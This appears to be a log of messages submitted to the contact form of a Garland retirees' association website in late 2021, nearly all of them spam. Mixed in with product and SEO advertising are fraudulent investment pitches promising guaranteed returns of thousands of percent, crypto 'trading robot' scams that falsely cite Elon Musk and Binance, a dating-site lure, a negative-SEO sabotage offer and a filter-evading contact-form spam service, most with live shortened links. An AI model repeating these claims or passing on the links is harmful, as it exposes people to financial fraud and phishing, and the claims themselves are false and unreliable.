CAREDOGBEST™ - Personalized Dog Harness. All sizes from XS to XXL.  Easy ON/OFF in just 2 seconds.  LIFETIME WARRANTY.

Click here: https://caredogbest.com
 
Thanks and Best Regards, 
 
Deangelo
E-Systems/Raytheon Garland Retirees
+++ 2021-11-17 02:24:30 AM -- Email from: Jenny Fincher, -- subject: Best Ad Network For Publishers And Bloggers In 2021, -- email: jenny@foremedia.net, -- Message is: Hey, I visited your site and I think that your content is amazing! It is really engaging and original, you must have worked so hard to generate such a quality content. We are ForeMedia and we help website owners with great websites to maximize the revenue they make from their website. I would love to buy Ad Spaces on your website and pay you per each impression of the ads on your site. We are Google Ad Exchange Premium partners and we work with more than 100 Ad Network &amp; thousands of premium direct advertisers who would LOVE to buy Ads directly from your site and we can guarantee to increase your revenue by at least 45% compared to other advertising solutions you are currently using. You deserve to earn more for your content and maximize your earning potential and I will help you unlock that potential! There is no cost, you can register to our monetization platform for free on this link: https://foremedia.net/start I will be available for you on the Live Chat if you need any help, or you can email me back to: jenny@foremedia.net if you have any questions. I have at least 17 Premium Advertisers that have asked me to approach you because they would like to advertise on your website on Premium eCPM [cost per impressions] basis. Have a good day &amp; feel free to ping me for any question! Click the link here for 1 minute registration to our platform [it's free!]: https://go.foremedia.net/u/start/
+++ 2021-11-17 02:50:17 AM -- Email from: Mike Bootman, -- subject: Strengthen your Domain Authority, -- email: no-replydrype@gmail.com, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a DA between 50 to 60 points in Moz with us today and reap the benefits of such a great feat. 
 
See our offers here: 
https://www.strictlydigital.net/product/moz-da50-seo-plan/ 
 
On SALE: 
https://www.strictlydigital.net/product/ahrefs-dr60/ 
 
 
Thank you 
Mike Bootman
+++ 2021-11-17 09:46:03 AM -- Email from: WTE, -- subject: WTE is offering you $10M to $50B in interest-free credit today, -- email: noreplahy@bit.ly/3HuVfsq, -- Message is: 
+++ 2021-11-17 09:47:52 AM -- Email from: WTE, -- subject: How to Make a 10,080% return on investment within 360 days without investment risks, -- email: info@100xroi.org, -- Message is: You can make a 10,080% return on investment within 360 days by investing in the 100X investment account at https://bit.ly/3m4uJOj .  The 100X investment account offers you a guaranteed 10,080% return on investment within 360 days without risks. Your investment is secured through the WTE investment protection program. Your 10,000% return on investment is 100% guaranteed through the Guaranteed ROI program. To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn    esyray.com
+++ 2021-11-17 01:16:40 PM -- Email from: Kyle Anderson, -- subject: Broken link on your website, -- email: anderson20173@gmail.com, -- Message is: Your site looks great but I did notice that the following link is broken: https://www.esyray.com/lettersfromretirees.html

I saw a couple small issues like this.  I thought you would like to know!  

In case you wanted to fix it, in the past we've used services from a website like DeadLinkInspector.com to keep our site error-free.
+++ 2021-11-17 05:07:42 PM -- Email from: Lynell Gantt, -- subject: , -- email: alio.shivams@halumail.com, -- Message is: We run your ads and you only pay for visitors we get you. Here's more details https://cutt.ly/jTqRbms
+++ 2021-11-18 01:17:33 PM -- Email from: GeorgeMaime, -- subject: Fast income from one investment more $ 9967 in a day, -- email: kyle.bender@tele2.at, -- Message is: Make Artificial Intelligence bring you from $ 8895 per day &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc7Wvjo&amp;sa=D&amp;04=14&amp;usg=AFQjCNHj_a66ufJc5MfSABppuo4GGGxh6w   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-11-18 03:30:15 PM -- Email from: Your Bank, -- subject: Own a $100B Digital Bank with $250K in 30 Days, -- email: noreplycbn88@bankbusiness.org, -- Message is: 
+++ 2021-11-18 04:43:13 PM -- Email from: Your Bank, -- subject: Get unlimited finance for business. 100% guaranteed., -- email: noreplycbn88@bankbusiness.org, -- Message is: 
+++ 2021-11-19 12:41:45 AM -- Email from: Elvia, -- subject: E-Systems/Raytheon Garland Retirees, -- email: isaacson.elvia@yahoo.com, -- Message is: New Multifunction Waterproof Backpack

The best ever SUPER Backpack: Drop-proof/Scratch-resistant/USB Charging/Large capacity storage

50% OFF for the next 24 Hours ONLY + FREE Worldwide Shipping for a LIMITED time

Buy now: https://thebackpack.sale

Best regards, 

Elvia
+++ 2021-11-20 10:33:14 AM -- Email from: HaroldNed, -- subject: Bitcoin trading bot that brings Elon Musk from $ 13000 per day, -- email: roweja@limestone.on.ca, -- Message is: A few weeks ago, Elon Musk, in an interview, accidentally blabbed about a cryptocurrency trading robot that brings him passive income from $ 13,000 to $ 135,000 per day and asked to remove this moment from the video after filming. 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8aMsu&amp;sa=D&amp;69=95&amp;usg=AFQjCNGiMsVvcKCjtUl1s1o9fbbu24TnPA 
But the operator who filmed all this remembered the name of the trading robot and tried to make money. 
On the same day, he made a deposit of $ 500 and launched a trading robot and after 3 hours his account had $ 3750 and a week later $ 563700. 
On the robot, you earn in the currency of your country, Europe - EUR, Australia - AUD, Canada - CAD, Sweden - SEC and so on. 
Hurry up to register as after the influx of new users, the administrators decided to stop registering new users from next week. 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8aMsu&amp;sa=D&amp;26=20&amp;usg=AFQjCNGiMsVvcKCjtUl1s1o9fbbu24TnPA
+++ 2021-11-21 12:28:31 AM -- Email from: Sophia Scott, -- subject: (2) Sophia sent you messages, -- email: wilber.ira@msn.com, -- Message is: Sophia sent you 2 messages yesterday. She is online now.
Click the link below to view the message and reply to her.

https://sexlovers.club/chat/SophiaScott/
+++ 2021-11-21 08:17:25 PM -- Email from: Benjamin, -- subject: esyray.com, -- email: benjamin.bates@msn.com, -- Message is: Hi 
 
PawSafer™ CAN SAFELY TRIM YOUR DOG'S NAILS IN NO TIME FROM HOME.

Get it while it's still 50% OFF + FREE Shipping

Buy here: https://pawsafer.shop
 
Regards, 
 
Benjamin
+++ 2021-11-23 02:53:32 AM -- Email from: Don Linder, -- subject: , -- email: oabh@bucol.net, -- Message is: I recently compiled a list of websites where you can advertise your business for free! Check it out: https://goolnk.com/1YD31D
+++ 2021-11-24 01:55:26 AM -- Email from: Clarence Coulston, -- subject: Negative SEO Services, -- email: coulston.clarence@gmail.com, -- Message is: Greetings

If you ever need Negative SEO to de-rank any site, you can hire us here
https://www.speed-seo.net/product/negative-seo-service/
+++ 2021-11-24 02:34:13 PM -- Email from: Eric Jones, -- subject: Strike when the iron’s hot, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hey there, I just found your site, quick question…

My name’s Eric, I found esyray.com after doing a quick search – you showed up near the top of the rankings, so whatever you’re doing for SEO, looks like it’s working well.

So here’s my question – what happens AFTER someone lands on your site?  Anything?

Research tells us at least 70% of the people who find your site, after a quick once-over, they disappear… forever.

That means that all the work and effort you put into getting them to show up, goes down the tubes.

Why would you want all that good work – and the great site you’ve built – go to waste?

Because the odds are they’ll just skip over calling or even grabbing their phone, leaving you high and dry.

But here’s a thought… what if you could make it super-simple for someone to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket?
  
You can – thanks to revolutionary new software that can literally make that first call happen NOW.

Talk With Web Traffic is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re still there at your site.
  
You know, strike when the iron’s hot!

CLICK HERE https://talkwithwebtraffic.com to try out a Live Demo with Talk With Web Traffic now to see exactly how it works.

When targeting leads, you HAVE to act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s why you should check out our new SMS Text With Lead feature as well… once you’ve captured the phone number of the website visitor, you can automatically kick off a text message (SMS) conversation with them. 
 
Imagine how powerful this could be – even if they don’t take you up on your offer immediately, you can stay in touch with them using text messages to make new offers, provide links to great content, and build your credibility.

Just this alone could be a game changer to make your website even more effective.

Strike when  the iron’s hot!

CLICK HERE https://talkwithwebtraffic.com to learn more about everything Talk With Web Traffic can do for your business – you’ll be amazed.

Thanks and keep up the great work!

Eric
PS: Talk With Web Traffic offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Stop wasting money chasing eyeballs that don’t turn into paying customers. 
CLICK HERE https://talkwithwebtraffic.com to try Talk With Web Traffic now.

If you'd like to unsubscribe click here http://talkwithwebtraffic.com/unsubscribe.aspx?d=esyray.com
+++ 2021-11-24 05:46:45 PM -- Email from: Hallie, -- subject: Hallie Valley, -- email: valley.hallie@gmail.com, -- Message is: Full Body Resistance Band Kit - The best and cheapest athletic gear available on the market today.
 
Do a full body workout from the comfort of your home. You don't even need a gym anymore! 

Save 50% OFF + FREE Worldwide Shipping

Shop Now: https://ametathletics.store

Sincerely,

Hallie
+++ 2021-11-24 06:05:48 PM -- Email from: Hans, -- subject: We have listed Jim Gray on our Directory., -- email: contact@d-hub.cc, -- Message is: Jim Gray,


We are DIRECTORIA business directory, currently, we are in the process of including new companies on our website. We have recently listed Jim Gray on our directory (for free).
This is an excerpt of the listing:


&quot;During a BBQ, Jane stumbled and took a little fall — she assured everyone that she was fine (they offered to call paramedics) she said she had just tripped over ...&quot; 

You can take a look at the full listing  here: --  https://directoria.co/jim-gray

If you want to  remove it  click here:  https://directoria.co/remove?ppc=WVZFcTMwTmJRU289

If you want to  make any changes, please, &quot;claim your listing&quot;   by clicking on widget on the right sidebar of your listing.
 

Thanks.
Directoria Team.
+++ 2021-11-24 11:02:54 PM -- Email from: Mike Cooper, -- subject: Local SEO for more business, -- email: no-replydrype@gmail.com, -- Message is: Hi 
 
We will enhance your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our plans here, we offer Local SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
NEW: 
https://www.speed-seo.net/product/zip-codes-gmaps-citations/ 
 
 
35% Black Friday / Cyber Monday coupon: 
 
BLACKOCEAN 
 
regards 
Mike Cooper
 
Speed SEO Digital Agency
+++ 2021-11-25 02:46:38 AM -- Email from: Terese Scarbrough, -- subject: Involved in a Car Accident?, -- email: teresemotorvehicleaccidentslawsuits.com, -- Message is: You've probably heard that most car accident cases settle well before any court trial. 

That's very true. 

Many even settle before a lawsuit is even filed. 

But that isn't always the case (no pun intended). If the parties can't agree on a key issue or two -- who was at fault for the car accident, the extent of the claimant's injuries, and so on -- 

then sometimes the only way to get things moving is to go to court and get the lawsuit process started..

https://motorvehicleaccidentslawsuits.com/
+++ 2021-11-26 01:32:22 AM -- Email from: Eric Jones, -- subject: Your site – more leads?, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hey, this is Eric and I ran across esyray.com a few minutes ago.

Looks great… but now what?

By that I mean, when someone like me finds your website – either through Search or just bouncing around – what happens next?  Do you get a lot of leads from your site, or at least enough to make you happy?

Honestly, most business websites fall a bit short when it comes to generating paying customers. Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment.

Here’s an idea…
 
How about making it really EASY for every visitor who shows up to get a personal phone call you as soon as they hit your site…
 
You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

You’ll be amazed - the difference between contacting someone within 5 minutes versus a half-hour or more later could increase your results 100-fold.

It gets even better… once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation.
  
That way, even if you don’t close a deal right away, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Pretty sweet – AND effective.

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-11-26 01:48:22 AM -- Email from: Elinor Satterfield, -- subject: , -- email: mrodukonr@crunchcompass.com, -- Message is: Here is a list of sites where you can post free ads:  https://ai6.net/zXWblo
+++ 2021-11-26 04:01:44 PM -- Email from: Katrice Pardo, -- subject: Get unique domains backlinks at cheap rates, -- email: pardo.katrice@gmail.com, -- Message is: Fix your esyray.com's linkprofile by getting more quality unique domains to link to your website

More info:
https://www.seo-treff.de/product/unique-domains-backlinks/
+++ 2021-11-27 02:32:56 AM -- Email from: contactyfjmyu, -- subject: Re: Contact Us, -- email: solopinacelestina1991@rambler.ru, -- Message is: Dear Madame, Dear Sirs! 
 
Newsletters  via contact configurationss to the sites of companies via any domain zones of the world.  
 
https://xn----7sbb1bbndheurc1a.xn--p1ai/ 
 
WHAT IS THE MAILING OF WEBSITES BY FEEDBACK FORMS? 
This is a type of mailing using the feedback forms that are located in the feedback section of the website and filled by our software in a preset mode with a rate of a few thousand feedback forms per 1 minute, while the alphabetic and numeric code from the pictures (CAPTCHA) is also solved. 
After that, the messages including your offers are sent to the mailboxes of companies. 
When sending mailing by contact feedback forms, it turns out that each internet resource sends a correspondent e-mail “to itself” and, therefore, all messages arrive in the inbox folder of the exact electronic address in which the firm is ready to receive the commercial information. 
 
Unique Trade Offer: 
Fast 100% informing of businesses and website owners about new cooperation offers. 
Search of new customers that other types of advertisements cannot find. 
 
THE MAIN AIM: 
Finding customers that cannot be found through other types of advertisements. 
 
Benefits: 
1.100% delivery of commercial messages. 
2.Increase of the customer database. 
3. Expansion of the your market segment. 
4.Mailings based on topics and regionality. 
5. Sending e-mails to directors. 
6. Conducting tenders and studying demand. 
7. Conducting marketing research. 
8. Conducting surveys and studying public opinion. 
9. Fast notofication. 
10. Price. 
11. Entering the international markets. 
 
Undeniable advantages: 
 
1.When sending mailing by contact forms, all messages arrive in the inbox folder. When sending mass e-mails, this can reach up to 5 percent. 
 
2.When sending mailing by contact forms it is possible to send a few million e-mails per day to inbox folders. When sending e-mail newsletters a few thousands arrive in the inbox folders, all the remaining ones often either do not reach or arrive in the junk. 
 
3. When sending mailing by feedback forms a letter does not get blocked by mails because it is sent from different internet resources. When sending mass e-mails it is possible to send a few thousands of those but nevertheless all the IP addresses from which the mailing is done will be banned. 
 
4. When sending mailing by feedback forms the minimum of macros is used to form text and headings of the letter. When sending mass e-mails, it is necessary to use synonyms («macros») for each word and create thousands various headings. 
 
5. Many companies deliberatelly hide their e-mail address and only leave a contact form for contacting with them. 
 
6. When sending e-mail newsletters, your business offer is delivered to every employee of the organisation, (which causes irritation) compared to mailing by feedback forms where the information is received at the electronic address specifically set up for  cooperation  offers. 
 
7.Fifty % of corporate e-mails are placed on free mail systems, they are poorly &quot;searchable&quot; by e-mail address, but when sending mailing by feedback forms through these mail systems, all letters are 100-percent delivered to the recipients. 
 
8. Only thirty-forty percent of organisations are placed in the directories within 2-3 years, and all the rest are already located in our WHOIS databases and are waiting for your cooperation  offers. 
Thus that mailboxes of companies from directories are spammed, which means that they will not have such profit as when sending mailing by feedback forms using our new WHOIS databases. 
 
9. Any kind of stop words in the body or headings of the letter can be sent through forms. When sending bulk e-mails, such messages either are not delivered the recipient or end up in a spam folder. 
The list of stop words of mail systems includes almost all words and phrases that encourage potential customers to take actions. 
 
Application: 
 
1. Expanding the customer base. 
2. Quick notification of marketplaces about new offers. 
3. Reaching out company officials. 
4.Supply. 
5. Conducting tenders. 
6.Conducting marketing campaigns. 
7.Conducting surveys and studying public opinion. 
8. Searching for customers internationally. 
 
Reasons for purchasing this service: 
 
1. one hundred percent delivery of your e-mails and cooperation offers to millions of organisations all over the world. 
Every website sends a letter to itself so all filters of mails are bypassed. 
 
2.Mailing by contact forms is an great way in for conducting all sorts of marketing researches, surveys and studies of  public opinion on anytype of activity and direction. 
When sending mailing by feedback forms, you will will be absolutely sure that your letter has been delivered to one hundred percent of users of your product and service and if a product or service is &quot;poorly promoted&quot;, then the potential issue lies in other things, for example in cost. 
At the same time, within 1 week you will see demand for your own products and services, you will not need to spend funds on renting an office and other more expensive and time-consuming marketing events. 
 
3.Mailing by contact forms is the most economical and quickest way to get your product or service to the markets of other countries. 
 
4. Mailing by feedback forms is an excellent tool for conducting all sorts of tenders. 
 
5.Daily update of the database, as more than one hundred and fifty thousand new websites, appear all over the world daily, and you, in turn, get new potential customers. 
 
6. Full geographical coverage for all states of the world. 
 
7. We offer clients that you will not find through other advertisement. 
When sending mailing by contact forms, you will be able to get to that part of your clients, that are impossible to find in automatic mode in any other way. 
For instance, you will be able to deliver a business offer to those potential customers that were previously out of reach due to filters of mail systems while sending bulk e-mails. 
In the markets, there is a unusual situation: companies in the directories are literally spammed with all sorts of business offers while very little or no e-mails are sent to the rest. 
 
8. Unique technique of decoding the CAPTCHA. 
There are special services for decoding numeric and alphabetic code (captcha/CAPTCHA). It costs a dollar to solve 1000  CAPTCHAs. 
It turns out that, processing 1 million sites our robot unravels 1 million captchas, which costs thousand dollars only to decode captcha/CAPTCHA, and we provide this free for you! 
 
9. By ordering mailing by feedback forms, you are promoting your service or product not to separate people, but to organisations, for example domain .com, where more than one hundred and fifty million business  businesses from all countries are accumulated (we have samples of them from international zones for every state). 
 
10. Mailing by feedback forms also includes a type of text mailing 
Email that is linked to the feedback form is the main e-mail of organisations through which orders and commercial offers are sent. This mail is also set up for cell phones as it is necessary to respond to the messages fast so as not to misplace the application or the relevance of the cooperation offer. 
 
11. The database of every country also includes all joint organisations from all over the world working with or closely related to this country, for instance, diasporas and national communities. 
Sanctions of search engines and mail systems? 
These mailings are an alternative to sending bulk e-mails, therefore search engine sanctions and &quot;BAN&quot; do not apply to them. 
Mail service delivers the data of e-mails to the inbox folder, as it bypasses through the &quot;warm e-mail channel&quot; from the new IP address of the website to the corporate e-mail of the same website. 
Simply speaking, these mailings &quot;live in e-mails&quot; and e-mail filters do not respond to them, because mails have a great level of trust in communication channels between internet resources and corporate electronic addresses. 
 
OUR DATABASES: 
 
You can purchase our databases separately from the mailing by sending us a message by feedback form. 
 
MORE THAN 2000 WHOIS DATABASES BY DOMAIN ZONES AND COUNTRIES. 
 
SELECTIONS OF DATABASES BY THE MAIN CONTINENTS. 
 
COLLECTIONS OF DATABASES BY THE MAIN WORLD LANGUAGES. 
 
SELECTIONS OF DATABASES BY THE MAIN WEBSITE BUILDERS. 
 
COLLECTIONS OF DATABASES BY THE MAIN COUNTRIES OF THE WORLD. 
 
HOW TO MAKE AN ORDER FOR MAILING BY CONTACT FORMS: 
The simplest text + headings, the main goal is to interest the client, and they will read the rest on your internet resource. 
Most likely, all ads on your subject are already on the Internet networks, use the search bar and choose the most relevant ones. 
The headings are substituted replacing each other from text file. 
Only messages in the text form are sent, links are inserted without problems, they are active. If the potential customer needs pictures or more specific information, then you should forward the potential customer to visit your website. 
 
In the letter: 
Text without pictures, since pictures do not pass through the feedback form. 
Your contact details: 
Website address: 
 
Fields to fill in: 
Name: 
Country: 
City: 
Site: 
Several headings: 
E-mail address for autoresponces: 
 
website: https://xn----7sbb1bbndheurc1a.xn--p1ai/ 
Price List: https://xn----7sbb1bbndheurc1a.xn--p1ai/en/price/
+++ 2021-11-27 09:20:38 AM -- Email from: Kendall, -- subject: E-Systems/Raytheon Garland Retirees, -- email: info@ed-valentine.com, -- Message is: Good day 

The New Powerful LED Flashlight is The Perfect Flashlight For Any Situation!

The 3,000 Lumens &amp; Adjustable Zoom gives you the wide field of view and brightness other flashlights don’t have.

50% OFF + Free Shipping!  Get it Now: https://linterna.shop

Best Wishes, 

Kendall
+++ 2021-11-28 02:13:51 AM -- Email from: Ranker SEO, -- subject: Rank 1 on Google With Ranker SEO, -- email: mathy.suzanna@gmail.com, -- Message is: Hello, 

Greetings from Ranker SEO.

Are you looking for a genuine SEO service to rank your website top on Google? Are you cheated by fake SEO companies? 

You have found an affordable legitimate SEO agency to rank your website.

We have ranked 100s of websites such as blogs, shopify stores, ecommerce websites, adult websites, saas websites, etc. You can reach more customers by utilizing our backlinks.

For real proof, you can visit our website and check out. Contact us for more details.

Our Skype ID: support@ranker.one
Our Website: https://www.ranker.one

Thanks &amp; Regards
Ranker SEO
+++ 2021-11-28 07:30:39 AM -- Email from: Candra Talbott, -- subject: 14 Best WordPress SEO Plugins and Tools That You Should Use, -- email: talbott.candra@gmail.com, -- Message is: 14 Best WordPress SEO Plugins and Tools That You Should Use
Things You Must Know About WordPress SEO Plugins &amp; Tools
When reading SEO tips or searching for “best free WordPress SEO plugins”, you will come across articles that feature several dozen tools.

Click Here to get the showcase

https://growbigger.net/14-best-wordpress-seo-plugins-and-tools-that-you-should-use/
+++ 2021-11-28 12:20:47 PM -- Email from: LloydViels, -- subject: (+!_ Binance: The Best Trading Robot in the World &quot;^%#, -- email: lightningkiller@arcor.de, -- Message is: According to Binance, this is the best trading robot in the world ?_%+ 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8qvzi&amp;sa=D&amp;28=22&amp;usg=AFQjCNH2QAwQV6sbS1u0SgHiVXKZSKhcKQ 
Because he is able to make 200% profit every day (*)^ 
For example, you replenished your brokerage account with $ 500 (EUR, GBP, etc.) and he earned you from $ 1000 in net income within a day ;&amp;№( 
Binance recommends using this particular trading robot for automated trading ;$?^ 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8qvzi&amp;sa=D&amp;54=23&amp;usg=AFQjCNH2QAwQV6sbS1u0SgHiVXKZSKhcKQ
+++ 2021-11-29 12:37:41 AM -- Email from: Pat Ackerman, -- subject: , -- email: oabh@bucol.net, -- Message is: I recently compiled a list of websites where you can advertise your business for free! Check it out: https://goolnk.com/1YD31D
+++ 2021-11-29 04:02:52 PM -- Email from: Brenda Prachyl, -- subject: Link to Pat Wooldridge's obituary, -- email: prachylb@aol.com, -- Message is: Hello,
You may already have this by now.  We look forward to the December luncheon.
Brenda Prachyl (Dottie Vaughn's daughter)

https://www.echovita.com/us/obituaries/tx/garland/patricia-louise-wooldridge-13715577
+++ 2021-11-29 04:53:28 PM -- Email from: Phil Judkins, -- subject: Get spendid X-Mas gifts your loved ones and friends, -- email: sales1@dittart.com, -- Message is: Dear Madam, Dear Sir Are you looking for splendid X-mas gifts for your loved ones and friends? In that case,  DittART Designer Necklaces could be your right choice. DittART designer necklaces are originals created by a famous jewelry designer. Every model is unique. They contain premium glass beads and gemstones, some of which are handmade. The beads are slip over on a nylon thread or a metal string. Every necklace is delivered with the designer’s certificate. Our necklaces own celebrities like country music stars, girlfriends of politicians, etc. In case of your interest in our designer necklaces, please check all models of these necklaces at our store https://dittart.com/4-all-models. We will be pleased to hear from you. Have a great day. Best regards Brian WRIGHT, Eng., DittART Designer Necklaces, Denver, CO, sales@dittart.com, https://dittart.com
+++ 2021-11-29 09:35:17 PM -- Email from: Joleen, -- subject: Best Offer for esyray.com, -- email: info@punjab2-0.com, -- Message is: Hi there 

Don't you hate carrying a big bulky backpack when you are only going out for the day? This high quality shoulder bag solves that problem. 
Carry enough without bogging yourself down! Perfect for that fishing trip or day hike!

50% OFF for the next 24 Hours ONLY + FREE Worldwide Shipping for a LIMITED time

Buy now: https://fashionbag.sale

Sincerely, 

Joleen
+++ 2021-11-30 06:22:20 AM -- Email from: Mike Backer, -- subject: cheap monthly SEO plans, -- email: no-replydrype@gmail.com, -- Message is: Hello 
 
I have just analyzed  esyray.com for its SEO metrics and saw that your website could use an upgrade. 
 
We will improve your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our services below, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start increasing your sales and leads with us, today! 
 
 
regards 
Mike Backer
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-11-30 09:14:35 AM -- Email from: Alex Moses, -- subject: It's about time to get to next level, -- email: mailmyvape@gmail.com, -- Message is: Hi there, 
My name is Alex Moses, I am a Zen Buddhist Monk, 
In the last 27 years, I’ve been helping entrepreneurs just like you to benefit from the esoteric Zen Buddhism. 
These ancient teachings will help you to improve relationships with friends, family, and increase income potential, working no more than 10 hours a week. 
That means you will have more time to do what you love, with people that you love while generating a great income. 
Are you open to a free one on one in person video meeting, so we can discover if we are a good fit? 
To get started, pick the time that will work for you from my calendar 
https://calendly.com/alexmoses 
Zen, Health, and Wealth, 
Alex Moses
+++ 2021-11-30 11:26:56 PM -- Email from: Jerryjuild, -- subject: Blockchain: The most profitable trading robot or income from $ 5000 per day !#(*, -- email: alex.buczkowski@web.de, -- Message is: Blockchain recommends to all people who are interested in additional permanent passive income of $ 5000 per day with a cryptocurrency trading robot. 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8qvzi&amp;sa=D&amp;48=60&amp;usg=AFQjCNH2QAwQV6sbS1u0SgHiVXKZSKhcKQ 
A trading robot is capable of making from 750% to 15000% profit per day %&amp;!% 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8qvzi&amp;sa=D&amp;59=94&amp;usg=AFQjCNH2QAwQV6sbS1u0SgHiVXKZSKhcKQ 
This success was achieved thanks to the advanced developments in the field of artificial intelligence ;+(&amp; 
Tens of thousands of people around the world are already using this trading robot, so start you ?)*+ 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8qvzi&amp;sa=D&amp;86=88&amp;usg=AFQjCNH2QAwQV6sbS1u0SgHiVXKZSKhcKQ 
To start, you need to do just three things: 
1. Make a deposit to your brokerage account from $ 500 %)№^ 
2. Launch the trading robot (=!- 
3. Receive passive income from $ 5000 per day **&quot;# 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8qvzi&amp;sa=D&amp;21=69&amp;usg=AFQjCNH2QAwQV6sbS1u0SgHiVXKZSKhcKQ
+++ 2021-12-01 12:55:18 AM -- Email from: Rogerduh, -- subject: Blockchain: The most profitable trading robot or income from $ 5000 per day (-%=, -- email: misssatansbraten1@web.de, -- Message is: Blockchain recommends to all people who are interested in additional permanent passive income of $ 5000 per day with a cryptocurrency trading robot. 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8qvzi&amp;sa=D&amp;34=70&amp;usg=AFQjCNH2QAwQV6sbS1u0SgHiVXKZSKhcKQ 
A trading robot is capable of making from 750% to 15000% profit per day (+?^ 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8qvzi&amp;sa=D&amp;40=91&amp;usg=AFQjCNH2QAwQV6sbS1u0SgHiVXKZSKhcKQ 
This success was achieved thanks to the advanced developments in the field of artificial intelligence %-*( 
Tens of thousands of people around the world are already using this trading robot, so start you :=%* 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8qvzi&amp;sa=D&amp;66=01&amp;usg=AFQjCNH2QAwQV6sbS1u0SgHiVXKZSKhcKQ 
To start, you need to do just three things: 
1. Make a deposit to your brokerage account from $ 500 *%№# 
2. Launch the trading robot &quot;&amp;:&amp; 
3. Receive passive income from $ 5000 per day *-)$ 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc8qvzi&amp;sa=D&amp;20=69&amp;usg=AFQjCNH2QAwQV6sbS1u0SgHiVXKZSKhcKQ
+++ 2021-12-01 01:29:34 PM -- Email from: Sophia Scott, -- subject: (2) Sophia sent you messages, -- email: deleon.garland@gmail.com, -- Message is: Sophia sent you 2 messages yesterday. She is online now.
Click the link below to view the message and reply to her.

https://sexlovers.club/chat/SophiaScott/
+++ 2021-12-01 07:20:22 PM -- Email from: Jess Blohm, -- subject: How to Add Facebook Open Graph Meta Data in WordPress, -- email: blohm.jess@gmail.com, -- Message is: Do you want to add Facebook Open Graph meta data to your WordPress themes?
Open Graph metadata helps Facebook and other social media websites get meta data about your posts pages. It also allows you to control how your content appears when shared on Facebook.

Click Here to get the Tutorial

https://growbigger.net/how-to-add-facebook-open-graph-meta-data-in-wordpress-themes/
+++ 2021-12-01 10:31:44 PM -- Email from: Willis Hatton, -- subject: From 0-$120k in 6 days, -- email: wasender99@gmail.com, -- Message is: Hey!

We have some amazing video's available for money making courses. Including amazing case studies.

Demo video: https://mega.nz/file/ttJAXJ4S#K0gd4o3Z0zo8_vpeHXxmonC2SdZjKABeBCMt3_7jFko

1) Dropshipping
2) Facebook Ads
3) Social Media Marketing
4) Affiliate Marketing
5) Amazon FBA
6) Copywriting Skill Courses
7) Crowdfunding
8) Crypto currency
9) eBay E-Commerce
10) Email Marketing
11) Forex &amp; Trading
12) Funnel Building
13) Google Adwords and Google Shopping
14) Instagram Marketing
15) Investment &amp; Credit
16) Messenger Bot Building
17) Personal Brand Building
18) Print on Demand
19) SEO
20) Youtube

We are selling it all for $99!

https://buy.stripe.com/6oEaFX7C5bIp5y08wJ
+++ 2021-12-02 09:23:33 PM -- Email from: Selene, -- subject: Selene Premo, -- email: selene@kierahuiel.com, -- Message is: Hands Free Automatic Toothpaste Dispenser

This is A 5 Star Product. With this you will brush your mouth with ease and style. Even your children would love to brush 3 Times daily!

FREE Worldwide Shipping for a LIMITED Time

Buy now: https://ecocoshop.online

Best regards,

Selene
+++ 2021-12-04 05:54:50 AM -- Email from: Sophia Scott, -- subject: (2) Sophia sent you messages, -- email: sierra.elaine10@yahoo.com, -- Message is: Sophia sent you 2 messages yesterday. She is online now.
Click the link below to view the message and reply to her.

https://sexlovers.club/chat/SophiaScott/
+++ 2021-12-04 06:24:26 AM -- Email from: Jeanette Jarman, -- subject: , -- email: nsamuelvale101@yaungshop.com, -- Message is: Automatic ad submitter - get continuous traffic from thousands of ads. Post your site now: https://goolnk.com/0rmWvG
